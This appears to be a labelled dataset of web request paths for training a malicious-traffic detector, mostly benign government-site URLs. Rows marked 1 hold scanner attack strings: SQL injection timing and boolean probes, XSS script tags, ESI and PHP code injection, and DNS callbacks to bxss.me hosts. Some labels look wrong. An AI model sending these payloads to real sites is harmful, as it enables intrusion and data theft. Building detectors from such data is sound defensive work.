request	label
/**********/system/more/209000000000000/0002/209000000000000_00000280.shtml	0
/*****/index/lists/cate_id/166.html	0
/zwxx_11337/****/202002/t20200208_1946819.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5c0f\u9ad8\u6cb9\u6f06\u7ecf\u9500\u90e8	0
/***/003/002/638/00300263827_608a812e.jpg	0
/****/system/2009/07/08/002769889.shtml	0
/zwxx_11337/****/201710/t20171009_503492.html	0
"/****/interface/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir=""/><script>alert(777)</script>"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u68b5\u68ee\u6d3b\u6027\u70ad\u6709\u9650\u516c\u53f8	0
/***/blockdata/getsearchinfo.do?&title=\u6842\u5e73\u53f8\u6cd5\u5385	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6765\u6211\u5bb6\u5403\u5927\u94c1\u9505\u7116\u9762\u9986	0
/**********/system/2020/03/20/013120193.shtml	0
/zwgk%' and 2*3*8=6*8 and 'jbq3'!='jbq3%/*******/zfxxgkzd/1.htm	1
/****/xyfw/jcjg/ and 1>1	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u524d\u8fdb\u519c\u573a\u5c0f\u9a6c\u8c03\u5473\u54c1\u5e97	0
/****/system/2020/05/27/013171323.shtml	0
/zwxx_11337/****/202009/t20200916_2233784.html	0
/******/resource/js/newcalendar/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.js	1
/*****/?loginid=00189471&stamp=1639991307520&token=67f1db1d3b0e75a4dc3d689fcd430377e86d078b&hrn=00189471	0
/**********/system/2020/05/11/013159187.shtml	0
/******/system/2010/10/29/010223491.shtml	0
"/' 'a'.concat(70-3).concat(22*4).concat(107).concat(82).concat(118).concat(72) (require'socket'
socket.gethostbyname('hitib' 'vquipiur065ac.bxss.me.')[3].to_s) '/***/slick.css"	1
/****/system/2016/10/19/javascript:dozoom(14)	1
/******/system/2021/11/26/013486351.shtml	0
/****/web/search?channelid=299868%') and 4469=7308	1
/**********/system/2021/11/29/013487593.shtml	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw_1815/202008/t20200818_2189656.html	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u946b\u6dfc\u65e5\u7528\u54c1\u5546\u884c	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u53bf\u9547\u7f57\u4f9b\u9500\u5408\u4f5c\u793e\u89c2\u97f3\u5206\u9500\u5e97	0
/*******/o38c4.php	1
/****/api/imageverification?id=0.4856520724492168	0
/******/resource/js/image/if(now()=sysdate(),sleep(12),0).js	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u548c\u76db\u6469\u6258\u8f66\u7ecf\u9500\u90e8	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u724c	0
/****/lhy/spbd/	0
/*/public/viewclick/?addclick=gdfslr07'; waitfor delay '0:0:12.944999999999999' -- &classid=243&id=8977	1
/****/jtdt/2021_jtyw/202107/t20210707_300931.html	0
/****/bmkx/hszh/202103/t20210311_178468.html	0
/************/template/jcse/110105008056111/bxss.me/images/plugin/voice/hzrecorder.js	1
/kefuzhongxin' and 2*3*8=6*8 and 'vsfw'='vsfw/*********/	1
/****/jtdt/2020_jtyw/202012/t20201231_268823.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9648\u70b3\u5764\u4e1c\u59ff\u536b\u6d74\u5efa\u6750\u5e97	0
/**********/system/2021/10/06/013460647.shtml	0
/*****/gy48/cpgyss.asp?key=\u04ba\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u8c78&l=\ufffd\ufffd\ufffd\ufffd	0
/****/czgk/bmyjs/rmtt/tw/201912/t20191216_1886720.html	0
/******/414/bq.shtml	0
/******/system/2016/08/25/javascript:void(0);	1
/**/ui/lib'||'/easyui/themes/bootstrap/linkbutton.css	1
/******/resource'||'/js/vsb_news_search.js	1
/**********/system/2021/12/18/013496261.shtml	0
/*****/javascript/bootstrap/fonts/glyphicons-halflings-regular.eot?	0
/****/wlzj/'.gethostbyname(lc('hitpa'.'zzzcjnydff162.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(104).chr(77).chr(115).chr(80).'/t20210303_2614145.html	1
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u9a6c\u597d\u82cf\u9762\u6761\u52a0\u5de5\u90e8	0
/***/blockdata/getsearchinfo.do?&title=\u603b\u533b\u9662	0
/****/qzfwj/202109/w020211011380464599400.png	0
/*****/gy42/ljcpgyview.asp?id=29408464&l2=\ufffd\ufffd\u0778&l=\ufffd\u3dab	0
/zwxx_11337/****/201808/t20180806_950476.html	0
"/****/zfwjn/1088/1104/list.html?new='""""()&%<acx><script >kllj(9587)</script>"	1
/****/rwfc/202011/t20201125_256652.html' and 'x'='x	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u96f7\u71d5\u901a\u8baf\u8bbe\u5907\u7ecf\u9500\u90e8	0
/***/interface/daily_clickcount.json.jsp?callback=jquery19105490149846833698_1639980033340	0
/******/usercenter/index?qrcode=5940&code=0213gyga1sv5lc0qepja1pd6u013gygy	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u6e58\u96c5\u5546\u52a1\u5bbe\u9986	0
/********/zhixiao	0
/****/czgk/bmyjs/rmtt/kx/201602/t20160218_318524.html	0
"/****/web/search?perpage=*/-->'""""></iframe></script></style></title></textarea><script >alert(06326)</script>"	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u660e\u51e4\u5e73\u4ef7\u5546\u5e97	0
/****/system/2006/10/13/javascript:dozoom(12)	1
/****/201502/p020150202449324021973.doc	0
/******/usercenter/index?qrcode=quicklyrq,3,97682,884245	0
/***/interface/daily_clickcount.json.jsp?callback=jquery111103647205330078075_1639980688886	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u4f9b\u9500\u793e\u9a7b\u9752\u94dc\u5ce1\u8f6c\u8fd0\u7ad9	0
/****/yfyfwpt/gjzdsys/'http:/leyubet1410.com/'	0
/******/system/2018/02/01/javascript:window.print()	1
/****/czgk/bmyjs/zzqfyxt/znxrmfy/	0
/*****/20200810/8464.html	0
/******/fxr_abcq_03.png	0
"/***/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
"/***/2020/12/15/art_31_0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z.html"	1
/**/vclogin'||'.do	1
/******/visitcount/visit.jsp?i_columnid=1&i_webid[0]=exp&i_webid[1]==1'and/**/extractvalue(1,concat(char(126),md5(1217688592)))and'&type=1	1
/**********/system/2020/07/22/013210650.shtml	0
/*****/system/2021/09/16/javascript:void();	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u535a\u4fe1\u901a\u624b\u673a\u5e97	0
/****************/images/common/default/img_no_data.png	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u840d\u840d\u5546\u884c	0
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u6d01\u857e\u7f8e\u53d1\u5e97	0
/**/system/2021/01/06/012112106.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5218\u6653\u6625\u767e\u8d27\u5546\u5e97	0
/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/sjfb/202107/t20210726_184968.html	0
/*****/system/2021/01/21/javascript:alert(1099).shtml	1
/****/rdjy/202112/t20211209_3211503.html	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(108).concat(78).concat(118).concat(87) (require""""socket""""
socket.gethostbyname(""""hitkh"""" """"xfpcneknefeec.bxss.me."""")[3].to_s) """"/******/zfczyjs/list.html"	1
/****/system/2021/11/25/javascript:dozoom(12)	1
"/******/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""""><script>alert(777)</script>894ba&type=&width="	1
/zwxx_11337/****/201904/t20190428_1445442.html	0
/**********/system/more/223000000000000/0011/223000000000000_00001104.shtml	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u6e90\u751f\u9152\u94fa	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9547\u7f57\u4f73\u4e3d\u901a\u8baf\u90e8	0
/*******/qiye/businesses-e52979.html	0
/**********/system/2021/08/02/013429130.shtml	0
"/****/zt/lxyz/\""javascript:void(0)\"""	1
/****/api/sources?resource=alert(/777/)&format=txt	1
/****/kjzl/fzlckjzl/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/**/system/2013/06/18/011113212.shtml	0
"/******/jslib/ckplayer/ckplayer.js/""""><script>alert(4610)</script>?_=1630312083348"	1
/****/0906/795125.shtml	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e91\u7aef\u901a\u8baf\u90e8	0
/************/interfaces/dimension.do?bxss.me	1
/****/mtgz/2010mtgz/index_5.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u683c\u74e6\u5947\u996e\u6599\u5382	0
"/****/mydevice/index.jsp?locale=""""><script>alert(777)</script>"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u4f17\u4ea8\u4e3d\u548c\u5546\u8d38\u6709\u9650\u516c\u53f8	0
/****/0219/331443.shtml	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6d2a\u5e7f\u9547\u73af\u5b87\u624b\u673a\u901a\u8baf\u5e7f\u573a	0
/***/nbhd/opengovmsgbox.do?method=listgovmsgboxs&siteid=115&order=1&appid=4&pageindex=11&pagesize=10	0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u7965\u5408\u798f\u7efc\u5408\u95e8\u5e02\u90e8	0
"/****/files.php?folder="""">alert(777)"	1
"/****/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/ncwywfgz/wzs/ltq/xmb_gzdxb.htm"	1
/**********/system/2020/05/12/013159933.shtml	0
/********/plan_template_preview.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','a719s'))	1
/**********/system/2020/11/13/013283307.shtml	0
/***//79/9tx958fg/xhr_send?t=1634942952247	1
/****/zdlygk' and 2*3*8=6*8 and 't78l'='t78l/ncwywfgz/wzs/ltq/xmb_gzdxb.htm	1
/****/20201011/e107936097.html	0
/*****/ywly/gccb/qywh/whln/kjcx/xyfw/gjcp/dxzdj/rlzy/jypx/	0
/**********/system/2021/11/28/javascript:void();	1
/zwxx_11337/****/202104/t20210422_2795105.html	0
/****/qzfwj/201801/t20180115_668806.html	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u5f00\u53d1\u533a\u8001\u90ed\u63a8\u571f\u673a\u914d\u4ef6\u90e8	0
/***/0/01/92/96/1929660_897990.jpg	0
"/****/zdlygk/ncwywfgz/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/hsbq/xmb_gzdxb.htm"	1
/***/0/00/84/70/847053_470643.jpg	0
"/******/main/admin/course_category.php?action=add&category=""""/><script>confirm(777)</script>"	1
/*******/qiye/businesses-e44596_20.html?category_id=	0
/****/js/lib/jquery.js?3422345= alert(2020)	1
/***/0/00/39/79/397977_999090.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6f6e\u6d41\u4e00\u65cf	0
/zwxx_11337/***/202010/t20201026_2266725.html	0
/**/index.php?do=post&id=355&c=dt&a=goods&	1
/**********/system/2020/03/14/013113760.shtml	0
/******/system/2017/10/31/javascript:void();	1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u738b\u6d69\u8d27\u8fd0\u90e8	0
/*******/202001/202001191221111081.html	0
"/col'""""()&%<acx><script >usz4(9220)</script>/******/index.html"	1
/****/xqldly/hfbyqz/zmhdyc_19.html	0
/********/plan_template_preview.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','kc1qu'))	1
/***/viewspace-162.html	0
/*******/17uefve.php	1
/******/nxrq_priv_icon1_4.png	0
"/******/20140319a.swf/""><script>alert(523)</script>"	1
/***/0/00/54/33/543310_984708.jpg	0
/****/czgk/bmjs/zzqjcyxt/yzqrmjcy/	0
/**/system/2020/09/02/012054384.shtml	0
/**/yanfazhongxin_03.jpg	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5f81\u8bda\u519c\u7267\u4e13\u4e1a\u5408\u4f5c\u793e	0
/*****/system/2021/08/20/javascript:window.print()	1
/****/20201205/3039.html	0
/**********/system/2021/06/08/013398656.shtml	0
/****/zfwjn/1088/1110/list_3.html	0
/***/0/01/96/74/1967417_634159.jpg	0
/****/0830/793775.shtml	0
/about-southwest/information-disclosure/**/index.html	0
/******/n42821'||'/n42825/index.html	1
/n42812'||'/******/n42825/n1588869/c1589259/content.html	1
"/****/web/search?page=2&channelid=253477 if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""""xor(if(now()=sysdate(),sleep(6),0))or""""*/&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10"	1
/****/web/search?channelid=254846';select sleep(5)	1
/**********/system/2021/12/01/013488300.shtml	0
/**********/system/more/245000000000000/0002/javascript:void();	1
/****/gjjtxysbdzt/gzsbd/201412/t20141218_49679.html	0
/****/bmkx/sczj/index_4.html	0
/****/mavideo/gvideos.php?gid=1 and 1=2	1
"/****/czgk/bmjs/sydw1/zzqlycyjj/\""javascript:void(0)\"""	1
/****/201909/t20190926_1757418.html	0
/****/web/search?channelid=222832&searchword=\u767d\u82a8\u6c9f\u77ff\u9a7b\u94f6\u5ddd\u5e02\u94f6\u65b0\u4e61\u7164\u5382	0
/**********/system/2021/09/01/013443152.shtml	0
/**********/system/2020/05/21/013167133.shtml	0
"/****/news/""><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/**********/system/2021/09/03/013445189.shtml	0
/****/czgk/bmjs/zzqfyxt/ltqrmfy	0
"/****/files.php?folder="""">alert(777)"	1
/*****/system/2020/07/07/javascript:void();	1
/**************/newscenter/system/2021/12/19/013496754.shtml	0
/***/zp-core/admin-upload.php?error=<script>alert(777)</script>	1
/**********/system/2021/09/17/013453113.shtml	0
/**********/system/2020/11/02/013275862.shtml	0
/*****/gy48/cpgyss.asp?key=\u58f3\u724c\u6da6\u6ed1\ufffd?\u5de5\u4e1a&l=\ufffd\ufffd\ufffd\ufffd	0
"/****/server/news/show/title/""><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
"/************/template/'""""()&%<acx><script >ljha(9197)</script>/110105008056111/16/images/plugin/analysis/jquery.windstagball.js"	1
/*******/8htoov.php	1
/****/tskmh/201903/ywly/gccb/kjcx/kjzl/qywh/whhd/xwzx/zdgz/	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u9547\u9510\u8bfa\u4e94\u91d1\u673a\u7535\u7ecf\u9500\u90e8	0
/****/ywly/rlzy/xwzx/jtdt/2021_jtyw/202110/rlzy/kjcx/qywh/xwzx/ztbd/	0
/****/wdszs/hfsz/202007/t20200722_169652.html	0
/***/0/01/94/16/1941662_789716.jpg	0
"/***/col6300/index.html"""" and """"x""""=""""x"	1
/zwxx_11337/***/201705/t20170502_304243.html	0
/****/gjdjbn/djbn_zyjh/index_1.html	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u4e09\u6cb3\u9547\u6052\u8a89\u79d1\u6280	0
/**********/system/2020/04/22/013146416.shtml	0
"/****/czgk/bmyjs/zzqjcyxt/xqqrmjcy/201903/"">\u5b81\u590f\u516c\u8def\u7ba1\u7406\u4e2d\u5fc3</a>"	0
/****/http://bxss.me/t/fit.txt/tjj/	1
"/********/css/isie.css?20190830=*/-->'""""></iframe></script></style></title></textarea><script >alert(44337)</script>"	1
/**********/system/2021/12/20/013496929.shtml	0
/****/bmkx/sgsj/202103/w020210311661757285631.jpg	0
/****/xxgknb/2013/list.html?new=bxss.me/t/xss.html?	1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1) and 1731=1731#&orderby=-docreltime&perpage=15&outlinepage=10	1
/*******/qiye/b-e2492186.html	0
/****/rsrm/200812/t20081210_318796.html	0
/**********/system/2021/09/06/ data:image/svg xml,<svg viewbox=	1
"/****/system/2021/09/08/013447520'""""/><iframe src=javascript:alert(1500) .shtml"	1
/****/gggs/202112/w020211217576061179618.jpg	0
/****/web/search?searchword=1&channelid=287219&perpage=24%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &templet=1&token=1	1
/zwxx_11337/****/202001/t20200119_1927139.html	0
/******/css/1.css	0
/**********/system/2016/09/28/012146896.shtml	0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15' and 3928=3488	1
/*****/system/2008/03/12/002444704.shtml	0
/***/003/004/088/00300408841_e34ed231.jpg	0
/****/zt/2018nb/zzqrmzf/	0
/****/mtgz/mt17_6390/201812/gygj/gjgk/fzlc/index_29.html	0
/****/wdszs/hfsz/202009/t20200914_172261.html	0
/****/system/2007/11/23/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u534e\u9f0e\u5546\u884c	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtjhqvd2t5pxbtxz6vipwqt8=&openid=ovl7jjr0xhxlt1yfzygk07kff2zk&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb1sd8g5socohe8ytx/dc3mloo8dbj5 fzedtzplsmcartcbkdjnftpbe1nhqbtysiedvf3vwnfcskmyi20mwwh8=&code=041rigll2jiik84y3jml2c3n5i2rigl-	0
/*******/qiye/b-e1654327.html	0
/****/bmkx/stjj/local	0
"/col'""""()&%<acx><script >bajv(9700)</script>/******/index.html"	1
/****/system/2021/12/07/javascript:window.print()	1
/***/com/menu/images/m-left.jpg	0
/****/bmkx/sfgw/202101/w020210108602276823489.jpg	0
"/****/annonce/moteur-prix.php?categoriemoteur=1"""">alert(777);"	1
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqhlsdlptcyygwh/201602/t20160218_318473.html	0
/**/system/2021/08/04/012188591.shtml	0
/*****/gy48/cpgyss.asp?key=\u8def\u7f18\u77f3\u5f00\u69fd\u673a&l=\ufffd\u3dab	0
/****/gggs/202110/t20211008_195117.html	0
"/******/3/o.src,type:""""get"""",datatype:""""script"""",async:!1,global:!1,""""throws"""":!0}):b.globaleval((o.text||o.textcontent||o.innerhtml||"""""""").replace(st,"""""""")));l=i=null}return"	1
/************/interfaces/autocomplete.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=if(now()=sysdate(),sleep(15),0)&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111	1
/******/qqh/bn/img2/4b.jpg	0
/**/system/2021/11/15/012222034.shtml	0
/****/category/zixunfuwu?page=1%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--	1
/*****/system/2008/01/30/002352076.shtml	0
/****/shouji/65807.htm?rand=2 and 9672=4201	1
/**********/system/2020/06/08/013180630.shtml	0
/*******/wcs7x.php	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5609\u7fd4\u7ae5\u88c5\u5e97	0
/*******/202006/202006291907591200.html	1
"/***/getdetail?vno=3.5.0&data={""news_id"":""1263828"",""diversion_id"":"""",""sign"":""""}"	0
/***/0/01/81/38/1813888_053914.png	0
/**/ui/widgets/hanweb/ie6fixed//xfs.bxss.me.js	1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 6719=3635 and '%'='	1
/*****/system/2021/11/03/javascript:void(0);	1
/****/\ufffd\ufffd\ufffd\u0dfd\ufffd\ufffd	0
/***/index.php?title=acunetixtest687243&action=submit	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u95fd\u5b81\u9547\u8f6e\u80ce\u5927\u5168	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u674e\u65fa\u9547\u8001\u4e70\u9884\u5236\u5382	0
/********/tsdlh/	0
/**/system/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/****/system/2016/11/06/javascript:window.close();	1
/wp-content/*******/wp-events-calendar/public/ajax/geteventslist.php?year=2018&month=5&day=1&calendar_id=1&pag=1	1
/***/index.php?title=acunetixtest50091b&action=submit	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u90ed\u5229\u9999\u68cb\u724c\u5ba4	0
/****/bwcx/xxyd/xxzl/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
"/************/template/jcse/110105008056111/16<esi:include src=""""http://bxss.me/rpb.png""""/>/images/plugin/mainframe/spellcheck.js"	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u59ae\u59ae\u818f\u8d34\u9986	0
/****/web/search?channelid=222832&searchword=\u5317\u4eac\u6d77\u4f51\u4ed3\u7535\u5b50\u5546\u52a1\u6709\u9650\u516c\u53f8\u94f6\u5ddd\u5206\u516c\u53f8	0
"/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=请输入关键词&searchid=1&tpl=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&websiteid=110105008056111"	1
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(3762)"">?_=1630312053301"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u675e\u4fe1\u5802\u7279\u4ea7\u5546\u884c	0
"/****/zfwjn/1088/1105/'""""()&%<acx><script >gva8(9495)</script>.html"	1
/****/bmfw/202010/w020201026406829676401.png	0
/******/zz-rem.min.js	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6768\u5efa\u8f89\u4e94\u91d1\u7ecf\u9500\u90e8	0
/****/dxzdj/	1
/***/interface/comul_total.json.jsp?callback=jquery19104823382989605798_1639980176436	0
/***/0/02/10/08/2100849_999817.jpg	0
/****************/notification/negotiate?access_token=f6720039-1e98-4e6b-8211-8a219badf284	0
/wp-content/*******/wp-booking-calendar/public/ajax/getmonthcalendar.php?wpml_lang=<script language='php'>echo 10516*61501;</script>&calendar_id=1&month=4&publickey=6lcdyoasaaaaacsevy6g4yo1bqxcgw15s15mb36- &year=2018	1
"/****/""><script>alert(64)</script>"	1
/**********/system/2020/04/17/013143149.shtml	0
/****/web/js/index.js	1
/******/jl_t0_20.png	0
/*******/ztsj/zt/2019wznb/	0
/**********/system/2021/09/25/013456441.shtml	0
/******/system/2021/11/26/013486291.shtml	0
/****/bmkx/swgxj/201610/t20161025_3069_wap.html	0
/****/bmkx/styj/201709/w020170922598211581387.jpg	0
/**********/system/2020/05/12/013160030.shtml	0
/***/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u65c5\u5ba2	0
/***/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects)	1
/***/template.cfm?moduletitle=alert(777)	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9a6c\u6c0f\u71d5\u5b50\u9ebb\u8fa3\u70eb\u51c9\u76ae\u6c38\u5eb7\u5df7\u5e97	0
/***/0/00/18/35/183555_393805.jpg	0
/****/dqgz/202107/w020210719514506418645.jpg	0
/****/zfxxgk/bxss.me/qtfdxx/	1
/**/test.jsp	1
/zwxx_11337/****/201707/t20170727_297467.html	0
/**/sustainability/csrreports/202109/t20210926_317263.html' and 'x'='x	1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u4e09\u53ea\u677e\u9f20	0
"/****/byszf/201802/t20180211_100275.html?leader=唐　生<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/******/repinglun	0
/****************/file/loadimage/?id=71b237df-8085-4eb9-ba74-734babb16aca	0
/*******/9zqcu.php	1
/**********/system/more/207000000000000/0040/207000000000000_00004027.shtml	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqxcb	0
/investors-garden/**********/video%' and 2*3*8=6*8 and 'zd0k'!='zd0k%/index_2.html	1
/*****/system/2016/12/13/012204510.shtml	0
/********/plan_template_preview.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','vhuvv'))	1
/*******/201906111450502886	0
/******/?(b.parentnode&&(b.outerhtml=a.outerhtml),p.support.html5clone&&a.innerhtml&&!p.trim(b.innerhtml)&&(b.innerhtml=a.innerhtml)):c===	1
/************/investment-advisory' and 2*3*8=6*8 and 'kbzt'='kbzt/2019-04-19/270.html	1
/****/qywh/whhd/index_1.html	0
/****/gjzqq/nmz/egde/201412/w020141212338527188584.jpg	0
/****/qzfwj/201801/t20180115_669074.html	0
"/****/zzxxgk/tjj/zfxxgkml_2127/jgzn_2042/list.html?new=' 'a'.concat(70-3).concat(22*4).concat(109).concat(74).concat(105).concat(70) (require'socket'
socket.gethostbyname('hitcf' 'qdthfxabd84c9.bxss.me.')[3].to_s) '"	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u96e8\u6b23\u6c46\u9762\u9986	0
/zwxx_11337/****/index_12.html	0
/****/wdsjs/hfswsj/index_wap_2.html	0
/******/fxr_abcp_11.png	0
/***/contractarchives/downtoviewdocumentsbycpd.z?downtoview=view&doccode=cpd-001-0005&orderingunit=steam&forderno=16223007	0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=shangwu¤tpage=1	0
/****/category/yidaiyilutupian?page=1 and 3691=4391	1
/**********/system/2021/12/16/013495447.shtml	0
/****/zzqzfwj/	0
/****/gavzzs-syxw-e105850377.html	0
"/****/main/messages/outbox.php?f=social"""" onmouseover=""""confirm(777)"	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u9f0e\u76db\u65b0\u7586\u5927\u76d8\u9e21	0
/****/jcgj/	0
"/****/server-session-details.jsp?hostname=""""/>alert(777)"	1
/**********/system/2021/12/14/013494006.shtml	0
/*****/gy42/cpgyss.asp?key=\ufffd\u05bd\ufffd\ufffd\u4e7f\ufffd\ufffd\ufffd\u037a\ufffd&l2=\ufffd\u017c\u04bf\ufffd&l=\ufffd\u04f1\ufffd	0
/****/system/2015/10/29/011852313.shtml	0
/**/system/2007/09/11/002201607.shtml	0
/******/resource' and 2*3*8=6*8 and '53kd'='53kd/js/news/mp4video.js	1
/**********/system/2021/04/01/013360684.shtml	1
/****/web/search?searchword=1&channelid=287219&perpage=24%' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)-- &templet=1&token=1	1
/******/ew/20161012133149779001.jpg	0
/****/20210126/9335.html	0
/**/ui/widgets/hanweb'||'/iconfont/css/iconfont.css	1
/if(now()=sysdate(),sleep(15),0)/**/lib/jquery.js	1
